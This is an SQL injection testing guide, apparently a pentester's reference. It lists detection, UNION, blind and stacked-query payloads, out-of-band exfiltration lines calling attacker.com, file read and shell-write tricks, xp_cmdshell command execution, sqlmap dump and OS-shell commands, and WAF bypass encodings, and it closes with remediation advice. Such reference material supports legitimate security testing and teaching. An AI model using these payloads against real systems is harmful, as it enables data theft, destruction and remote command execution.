# SQL Injection Testing

## Overview
SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that construct SQL queries from user-supplied input. It allows attackers to interfere with database queries, potentially reading, modifying, or deleting data.

## Classification
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 7.5 - 9.8 (High to Critical)
- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

## Detection Methodology

### 1. Input Point Identification
Identify all user-controllable input points:
- URL parameters (`?id=1`, `?search=test`)
- POST body parameters (form data, JSON, XML)
- HTTP headers (Cookie, User-Agent, Referer, X-Forwarded-For)
- REST API path parameters (`/api/users/1`)
- File upload filenames
- WebSocket message fields

### 2. Error-Based Detection
Inject characters that break SQL syntax and observe error responses:
```
' (single quote)
" (double quote)
`) (backtick)
; (semicolon)
-- (SQL comment)
# (MySQL comment)
' OR '1'='1
" OR "1"="1
1' AND '1'='1
1' AND '1'='2
```

**Indicators of vulnerability:**
- Database error messages (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Different response content/length between true and false conditions
- HTTP 500 errors on injection characters

### 3. Boolean-Based Blind SQLi
When no visible errors, use boolean conditions:
```sql
-- True condition (normal response)
1' AND 1=1--
-- False condition (different response)
1' AND 1=2--
```
Compare response length, content, or HTTP status codes.

### 4. Time-Based Blind SQLi
When boolean differences aren't visible:
```sql
-- MySQL
1' AND SLEEP(5)--
-- PostgreSQL
1'; SELECT pg_sleep(5)--
-- MSSQL
1'; WAITFOR DELAY '0:0:5'--
-- Oracle
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
-- SQLite
1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

### 5. UNION-Based SQLi
Determine column count and extract data:
```sql
-- Find column count
' ORDER BY 1-- (increment until error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data
' UNION SELECT username,password FROM users--
```

### 6. Stacked Queries
Execute additional queries:
```sql
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password')--
```

### 7. Out-of-Band (OOB) SQLi
Exfiltrate data via DNS or HTTP:
```sql
-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'));
-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\a'
-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual;
```

## Database-Specific Techniques

### MySQL
- Version: `SELECT @@version`
- Current DB: `SELECT database()`
- Tables: `SELECT table_name FROM information_schema.tables`
- Columns: `SELECT column_name FROM information_schema.columns WHERE table_name='users'`
- String concat: `CONCAT(a,b)` or `a || b`
- Comment: `--`, `#`, `/* */`
- File read: `LOAD_FILE('/etc/passwd')`
- File write: `INTO OUTFILE '/tmp/shell.php'`

### PostgreSQL
- Version: `SELECT version()`
- Current DB: `SELECT current_database()`
- Tables: `SELECT tablename FROM pg_tables WHERE schemaname='public'`
- String concat: `a || b`
- Command execution: `COPY (SELECT '') TO PROGRAM 'id'`
- Large object read: `SELECT lo_import('/etc/passwd')`

### Microsoft SQL Server
- Version: `SELECT @@version`
- Current DB: `SELECT db_name()`
- Tables: `SELECT name FROM sysobjects WHERE xtype='U'`
- Command execution: `EXEC xp_cmdshell 'whoami'`
- Enable xp_cmdshell: `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE`
- Linked servers: `EXEC sp_linkedservers`

### Oracle
- Version: `SELECT banner FROM v$version`
- Current DB: `SELECT ora_database_name FROM dual`
- Tables: `SELECT table_name FROM all_tables`
- String concat: `a || b`
- No LIMIT clause — use `ROWNUM`

### SQLite
- Version: `SELECT sqlite_version()`
- Tables: `SELECT name FROM sqlite_master WHERE type='table'`
- No `SLEEP()` — use heavy computation
- `ATTACH DATABASE` for file write

## Tool Usage

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Deep scan
sqlmap -u "http://target.com/page?id=1" --level 5 --risk 3 --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump --batch

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# With cookie/header auth
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# WAF bypass with tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch
```

## WAF Bypass Techniques
- Case variation: `sElEcT`, `UnIoN`
- Comment insertion: `UN/**/ION`, `SEL/**/ECT`
- URL encoding: `%55NION`, `%53ELECT`
- Double URL encoding: `%2555NION`
- Unicode: `%u0053ELECT`
- Whitespace alternatives: `/**/`, `%09`, `%0a`, `%0d`
- Function alternatives: `MID()` instead of `SUBSTRING()`

## Remediation
1. **Parameterized queries / Prepared statements** (primary defense)
2. **Stored procedures** (with parameterized calls)
3. **Input validation** (whitelist approach)
4. **Escaping user input** (last resort)
5. **Least privilege** database accounts
6. **WAF rules** (defense in depth, not primary)

## Evidence Collection
When documenting SQL injection findings:
- Screenshot/log of injected payload and response
- Database type and version extracted
- Tables/data accessed (sanitize sensitive data)
- Impact assessment (read, write, execute)
- Exact URL and parameter affected
